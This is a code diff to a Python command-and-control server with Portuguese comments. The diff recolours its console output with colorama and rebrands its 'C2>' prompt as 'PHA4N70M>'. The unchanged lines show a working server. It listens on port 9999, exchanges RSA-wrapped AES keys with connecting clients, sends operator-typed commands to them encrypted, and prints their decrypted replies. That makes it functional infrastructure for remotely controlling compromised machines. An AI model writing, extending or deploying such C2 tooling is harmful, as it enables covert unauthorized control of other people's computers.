@@ -3,10 +3,14 @@ import threading
 import json
 import time
 import os
+from colorama import init, Fore, Style
 from cryptography.hazmat.primitives.asymmetric import rsa, padding
 from cryptography.hazmat.primitives import serialization, hashes
 from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
 from cryptography.hazmat.backends import default_backend
+
+# Inicializa o colorama
+init(autoreset=True)
 
 # Gerar chave RSA (criptografia assimétrica)
 private_key = rsa.generate_private_key(
@@ -55,21 +59,21 @@ def authenticate(client_socket):
     # Receber chave AES criptografada com RSA
     encrypted_aes_key = client_socket.recv(256)
     aes_key = rsa_decrypt(encrypted_aes_key)
-    
+
     return aes_key
 
 # Função para lidar com cada cliente
 def handle_client(client_socket, addr):
-    print(f"Conexão recebida de {addr}")
+    print(Fore.GREEN + f"Conexão recebida de {addr}")
     
     # Autenticação RSA e troca de chave AES
     aes_key = authenticate(client_socket)
-    print("Autenticação concluída.")
+    print(Fore.BLUE + "Autenticação concluída.")
 
     while True:
         try:
-            # Receber comando do C2 e criptografar com AES
-            command = input("C2> ")
+            # Receber comando do PHA4N70M e criptografar com AES
+            command = input(Fore.YELLOW + "PHA4N70M> ")
             encrypted_command = encrypt_aes(aes_key, command)
             client_socket.send(encrypted_command)
 
@@ -79,10 +83,10 @@ def handle_client(client_socket, addr):
             # Receber resposta do cliente
             response = client_socket.recv(4096)
             decrypted_response = decrypt_aes(aes_key, response)
-            print(f"Resposta do cliente {addr}: {decrypted_response}")
+            print(Fore.CYAN + f"Resposta do cliente {addr}: {decrypted_response}")
 
         except Exception as e:
-            print(f"Erro com cliente {addr}: {e}")
+            print(Fore.RED + f"Erro com cliente {addr}: {e}")
             break
 
     client_socket.close()
@@ -90,9 +94,9 @@ def handle_client(client_socket, addr):
 # Função principal do servidor
 def main():
     server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    server.bind(("0.0.0.0", 9999))  # Porta principal do servidor C2
+    server.bind(("0.0.0.0", 9999))  # Porta principal do servidor PHA4N70M
     server.listen(5)
-    print("C2 ouvindo na porta 9999...")
+    print(Fore.MAGENTA + "PHA4N70M ouvindo na porta 9999...")
 
     while True:
         client_socket, addr = server.accept()
